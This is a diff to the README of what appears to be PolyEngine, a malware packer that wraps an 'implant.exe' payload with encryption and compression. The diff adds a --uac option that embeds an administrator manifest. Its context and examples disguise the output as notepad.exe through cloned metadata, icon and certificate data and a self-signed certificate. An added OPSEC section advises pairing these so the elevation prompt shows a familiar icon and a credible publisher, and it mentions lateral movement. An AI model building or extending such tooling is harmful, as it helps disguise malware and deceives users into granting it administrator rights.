@@ -86,6 +86,9 @@ Identity spoofing:
                              donor's signer (HashMismatch — defeats visual inspection only).
                              Name output to match donor OriginalFilename field.
                              When combined with --pfx: real signature overwrites cloned cert.
+  --uac                      Embed a UAC elevation manifest (requireAdministrator).
+                             Output PE prompts for admin privileges on launch.
+                             Applied as Phase 10.5 (after packing, before signing).
 
 Examples:
   Builder.exe implant.exe     packed.exe
@@ -99,6 +102,8 @@ Examples:
   Builder.exe implant.exe     packed.exe --pfx cert.pfx --ts-url http://timestamp.digicert.com
   Builder.exe implant.exe     notepad.exe --clone-meta C:\Windows\System32\notepad.exe
   Builder.exe implant.exe     notepad.exe --clone-meta notepad.exe --pfx self.pfx
+  Builder.exe implant.exe     packed.exe  --uac
+  Builder.exe implant.exe     notepad.exe --uac --clone-meta notepad.exe --pfx self.pfx
 ```
 
 ---
@@ -303,6 +308,27 @@ Get-AuthenticodeSignature .\notepad.exe | Format-List *
 # signtool independent check
 signtool verify /pa /v notepad.exe
 ```
+
+</details>
+
+<details>
+<summary><b>UAC elevation — requireAdministrator manifest</b></summary>
+
+Embed a `requestedExecutionLevel="requireAdministrator"` manifest so the output PE triggers a UAC prompt on launch and receives a high-integrity token if the user approves:
+
+```
+Builder.exe implant.exe packed.exe --uac
+```
+
+The manifest is an `RT_MANIFEST` resource (resource ID 1 — `CREATEPROCESS_MANIFEST_RESOURCE_ID`), the same slot the Windows loader checks for application compatibility and privilege manifests. The output is otherwise identical to a build without `--uac`; no changes to the Stub or payload path.
+
+**Combination with `--clone-meta` and `--pfx`:** Phase 10.5 (manifest) runs before Phase 11 (clone) and Phase 12 (sign). The Authenticode signature computed in Phase 12 covers all embedded resources including the manifest — the hash is valid over the final binary. The UAC dialog shows the publisher name from the signing cert:
+
+```
+Builder.exe implant.exe notepad.exe --uac --clone-meta notepad.exe --pfx self.pfx --pfx-pass hunter2
+```
+
+**OPSEC:** a UAC prompt is a visible, user-facing event. The "Do you want to allow this app to make changes to your device?" dialog displays the on-disk filename and the Authenticode publisher (or "Unknown publisher" if unsigned). Combine `--uac` with `--clone-meta` to show a familiar icon and `--pfx` to show a credible publisher. For unattended execution that already starts from an elevated process (e.g. service, WMI lateral movement, local admin shell), `--uac` is unnecessary.
 
 </details>
 
@@ -707,7 +733,8 @@ PolyEngine/
 ├── Builder/
 │   ├── Builder.cpp          — CLI parser, orchestration, CryptGenRandom salt/indices
 │   ├── CloneMeta.cpp/h      — PE identity cloning: VERSIONINFO + icon + cert directory (--clone-meta)
-│   └── PeSigning.cpp/h      — optional Authenticode signing via mssign32!SignerSignEx2 (--pfx)
+│   ├── PeSigning.cpp/h      — optional Authenticode signing via mssign32!SignerSignEx2 (--pfx)
+│   └── UacManifest.cpp/h    — UAC elevation manifest embedding: RT_MANIFEST/requireAdministrator (--uac)
 ├── Engine/                  — shared between Builder and Stub (compiled into both)
 │   ├── Compression.c/h      — LZNT1 compress (Builder) / decompress (Stub) wrappers
 │   ├── Crypto.c/h           — CompoundEncrypt inner cipher (XOR+ROL+ADD+XOR)
